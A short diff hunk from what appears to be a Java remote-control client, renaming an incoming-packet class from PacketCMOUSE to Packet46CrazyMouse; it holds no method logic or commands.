@@ -7,7 +7,7 @@ import java.util.Random;
 import com.redpois0n.Connection;
 import com.redpois0n.Main;
 
-public class PacketCMOUSE extends AbstractIncomingPacket {
+public class Packet46CrazyMouse extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
